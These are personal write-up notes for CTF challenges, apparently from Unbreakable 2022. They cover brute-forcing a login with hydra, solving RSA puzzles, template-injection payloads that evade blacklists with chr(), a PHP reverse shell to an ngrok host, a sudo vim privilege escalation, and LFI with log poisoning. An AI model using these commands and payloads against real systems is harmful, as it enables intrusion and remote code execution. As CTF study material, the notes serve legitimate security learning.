`Bruteforce` our way through the login page with the rockyou.txt 
wordlist bruteforce.


    hydra -l bob -P /usr/share/wordlists/rockyou.txt 34.89.210.219 -s 30203 http-form-post "/index.php:username=^USER^&password=^PASS^:Invalid username or password"  -V

The request hydra uses is of the type: `"/path:post_request_data:Invalid response text"`
We substitute where the user and the pass would go with `^USER^`and `^PASS^`


We find password bob:cheerleader -> we get message not the right privileges, Try Harder!

We go for the user admin this time
we find the password admin:precious1 -> and we get the flag: CTF{aa4e966537c108ecd32d64096a6666ba96f15ec147a2aaec24d5ae26b7ad6e14}

-------------------------------------------------------------



### VERY GOOD RESOURCES FOR FINDING ENCRYPTION ALGORITHMS: 
- `https://www.dcode.fr/cipher-identifier`
- `cyberchef`

Also look for good writeups here: 

`https://mstefanc.com/2022/05/08/unbreakable-ctf-2022-individual-writeups/`

-----------------------------------------------------

### UNBREAKABLE 2022 TEAMS COMPETITON

1. RSA-POP-QUIZ

p = 17
q = 23
e = 7

n = pq = 391
theta(n) = 16*22 = 352

=> d = 151

-----------------
e = 65537
phi(n) = 7921872076
c = 7326956863
p = ?

    The function phi(n) is called the EULER'S TOTIENT. This function can be found in 'from sympy.ntheory.factor_ import totient' package in python

------------------------

### Interesting RSA facts:
 - RSA = Rivest-Shamir-Adleman
 - RSA was developed and publicly shown in 1977
 - Acording to NIST, the RSA key should be 2048 bits long
 - RSA is crackable, but veeeery time consuming
 - `www.factordb.com` is the place to go to get the prime factors of a number
 - `www.dcode.fr` is the best encryption tool website

------------------------------------
### dont-chat-too-much-about-RSA

But the public key is the parameter N = p*q
p+q = x

p = x - q
N = (x-q)*q = xq - q^2


Here we extracted the hidden data with steghide, then recovered this text: 
THISwasTOOiziECB
-> this has 16 bytes, so we figure it might be AES with ECB mode
We decode the secret conversation using Cyberchef, then we get the sum of p+q in there. From the public key we get the values of N, e using dcode.fr.

From here we find p and q uzing `z3 solver!!!`

read data from secret, base64 -d, the hexdump -d to get integer variable, or just do int(data, 16) in python.
After finding those, we take the text in secret, which is in base64 and put all the variables into RSA decrypt from dcode.fr and we get the flag 

CTF{kn0wiNG_7H3_5um_0f_pRIM35_i5_r3ALLy_DaNg3r0u2}.

### GREAT WEBSITE FOR STEGANOGRAPHY CHALLENGES (Images mostly)

`https://aperisolve.fr/`
!!!!!!


---------------------------------------------------
    ${self.module.cache.util.os.system(chr(108)%2Bchr(115))}
    99 97 116 32 39 102 108 97 103 46 116 120 116 39


You can bypass blacklists by using chr() and url encoded chars

    ${self.module.cache.util.os.popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(42)).read()}


696d706f7274206f730a783d6f732e706f70656e286964292e7265616428290a

----------------------------------------------------------------------

TO solve `Linux problem escalation`, we first need to `connect a reverse shell to our machine`. We use that with ngrok, since we know the web interface uses php, we leverage a php command. 


--------------------------------------------------------------------

### FOR OSINT challenges

- If something was deleted from the internet and you have to find it, go to `WayBackMachine (htts://web.archive.org/)` and you shall find everything there. Look for the keywords, search them up on google.

 - For extracting text from an image, you can use an OCR tool.

`https://shellgenerator.github.io/ -- generate shells`

    php -r '$sock=fsockopen("2.tcp.eu.ngrok.io",18809);exec("/bin/sh -i <&3 >&3 2>&3");'

### You start your 'ngrok tcp 1234', and then you start a ncat -nlvp 1234, where YOU WILL RECEIVE THE CONNECTION!!!

1. From there, we find the first flag by cracking the secret shadow.bak file.
2. Then first we do sudo -l to find that user2 can perform vim with sudo privileges, and we run it with 'sudo -u user3 /usr/bin/vim'!!!
3. From there we run :!/bin/bash -> and we are user3!!!

-------------------------------------------------------------

### No-external-communication
#### Solve : curl  http://34.89.210.219:30051/router.php?page=php://filter/convert.base64-encode/resource=flag.php | base64 -d

- This is a `local file inclusion attack`, where we could access ../../../etc/passwd, also found flag.php, but since it is a php file that executes, it just displays 'try harder', which denotes that we have to extract the contents of the file by encoding them.

- The LFI vulnerability can be also exploited using `LOG POISONING`
- Once you identify that you can do `directory traversal`, identify that the web server running is Apache, through a quick google search you identify that the `ACCESS LOG FILES of apache are in [ var/log/apache2/access.log ]`.
- If you go to that address, you can see all the GET requests, the paths and the User-Agent information

- Usually, in **LFI and Log Poisoning vulnerabilities**, the `User-Agent` is the field that will be `poisoned/injected with php code.`
We will inject php code into User-Agent and view the output of this request in the access log.

- First, we should see if it is injectable, and if it is `what functions are disabled on it`.
    
    User Agent: `<?php echo phpinfo(); ?>`

 - Once we send the request, we look at disabled functions, and see that shell_exec is enabled in this case and we can execute arbitary shell commands! we do ls, cat flag.php and checkout the page source for the access logs since the flag is usually in the comments of the code.
